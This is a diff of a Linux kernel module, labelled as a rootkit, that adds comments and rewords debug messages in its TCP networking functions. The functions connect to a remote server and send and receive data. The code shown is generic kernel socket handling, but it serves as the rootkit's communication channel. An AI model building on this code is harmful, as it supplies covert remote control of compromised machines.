@@ -4,31 +4,32 @@
 #include<net/sock.h>
 
 
-struct Server{
-	struct sockaddr_in s_addr; 
-	struct socket *sock;
-	struct kvec sock_vec;
-	struct msghdr sock_msg;
-	char *message;
+struct Server{ //structure holding data of the server
+	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
+	struct socket *sock; //structure holding socket object
+	struct kvec sock_vec; //holds vector of data recieved
+	struct msghdr sock_msg; //structure to hold data recieved
+	char *message; //structure to hold message sent or recieved
 };
 
-struct Server server;
+struct Server server; //global declaration of Server struct
 
-int server_print(char *message);
-/*basic functions without ability to authenticate*/
-static int net_connect(char *ipaddr, int port){
+
+	/*========================*\
+		networking functions
+	\*========================*/
+static int net_connect(char *ipaddr, int port){ //connects to server
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
-	int err;
+	int err; //int to hold error codes
 
 	// kernel memory allocate a send and recieve buffer
-	server.message = kmalloc(BUFFER_SIZE, GFP_KERNEL);
-	if (server.message == NULL) {
-		printk(KERN_DEBUG "client: buffer kmalloc error!\n");
-		return -1;
+	server.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
+	if (server.message == NULL) { //if message is null
+		printk(KERN_DEBUG "[rootkit] net_connect- buffer kmalloc error!\n"); //prints debug info
+		return -1; //returns -1 for error
 	}
-
-	//zeroes out the s_addr
-	memset(&(server.s_addr), 0, sizeof(server.s_addr));
+	
+	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the s_addr
 
 	server.s_addr.sin_family = AF_INET; //sets the family
 	server.s_addr.sin_port = htons(port); //sets the port
@@ -36,58 +37,60 @@ static int net_connect(char *ipaddr, int port){
 	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket
 
 	//creates a socket- &init_net is the default network namespace
-	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock));
-	if (err < 0) {
-		printk(KERN_DEBUG "[rootkit] server_connect:socket creation error!\n");
-		return -1;
+	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket
+	if (err < 0) { //if error creating socket
+		printk(KERN_DEBUG "[rootkit] net_connect- socket creation error!\n"); //print debug info
+		return -1; //returns -1 for error
 	}
 
-	err = server.sock->ops->connect(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr), 0);
-	if (err != 0){
-		printk(KERN_DEBUG "[rootkit] server_connect: error connecting!- %i\n", err);
-		return -1;
+	err = server.sock->ops->connect(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr), 0); //connects to the server
+	if (err != 0){ //if unable to connect
+		printk(KERN_DEBUG "[rootkit] net_connect: error connecting!- %i\n", err); //print debug info
+		return -1; //return -1 for error
 	}
-	printk(KERN_DEBUG "[rootkit] server_connect: connected to server");
-	return 0;
-} //connects to the server
-static int net_send(void){
+	return 0; //return 0 for no errors
+}
+
+static int net_send(void){ //sends data to the server
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
-	int err;
-	if (strlen(server.message)==0){
-		printk(KERN_DEBUG "[rootkit] net_send: no message!");
-		return -1;
+	int err; //int to hold error codes
+	if (strlen(server.message)==0){ //if no message to be sent
+		printk(KERN_DEBUG "[rootkit] net_send- no message!"); //print debug info
+		return -1; //return -1 for error
 	}
 	memset(&(server.sock_msg), 0, sizeof(server.sock_msg)); //zeroes out message buffer
 	memset(&(server.sock_vec), 0, sizeof(server.sock_vec)); //zeroes out message vector
 	server.sock_vec.iov_base = server.message; //sets the data to be sent
-	server.sock_vec.iov_len = BUFFER_SIZE;
-	// send data
-	err = kernel_sendmsg(server.sock, &(server.sock_msg), &(server.sock_vec), 1, BUFFER_SIZE);
-	printk("\n");
-	if (err < 0) {
-		printk(KERN_DEBUG "[rootkit] server_send: kernel_sendmsg error!\n");
-		return err;
+	server.sock_vec.iov_len = BUFFER_SIZE; //sets the size of the message
+
+	err = kernel_sendmsg(server.sock, &(server.sock_msg), &(server.sock_vec), 1, BUFFER_SIZE); // sends data
+	if (err < 0) { //if error sending message
+		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!\n"); //print debug info
+		return err; //return error
 	}
-	else if(err != BUFFER_SIZE){
-		printk(KERN_DEBUG "[rootkit] server_send: err!=BUFFER_SIZE\n");
+	else if(err != BUFFER_SIZE){ //if not all data sent
+		printk(KERN_DEBUG "[rootkit] net_send- unable to send entire message\n"); //print debug info
+		return -1; //return -1 for error
 	}
-	return 0;
-} //sends message
-static int net_recv(void){
+	return 0; //return 0 for no errors
+}
+
+static int net_recv(void){ //recieves data from server
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
-	int err;
+	int err; //int to hold error codes
 	memset(server.message, 0, BUFFER_SIZE); //zeroes out message buffer
 	memset(&(server.sock_msg), 0, sizeof(server.sock_msg)); //zeroes out message buffer
 	memset(&(server.sock_vec), 0, sizeof(server.sock_vec)); //zeroes out message vector
-	server.sock_vec.iov_base=server.message;
-	server.sock_vec.iov_len=BUFFER_SIZE;
-	err = kernel_recvmsg(server.sock, &(server.sock_msg), &(server.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0);
-	if (err < 0){
-		printk(KERN_DEBUG "[rootkit] server_recv: error recieving data");
-		return -1;
+	server.sock_vec.iov_base=server.message; //sets the location of buffer for recieved data to be placed
+	server.sock_vec.iov_len=BUFFER_SIZE; //sets the size of the message
+	
+	err = kernel_recvmsg(server.sock, &(server.sock_msg), &(server.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0); //recieves message
+	if (err < 0){ //if error recieving message
+		printk(KERN_DEBUG "[rootkit] server_recv: error recieving data"); //print debug info
+		return -1; //return -1 for error
 	}
-	return 0;
-} //recieves message
+	return 0; //return 0 for no errors
+}
 
 
 static int server_connect(char *ipaddr, int port){
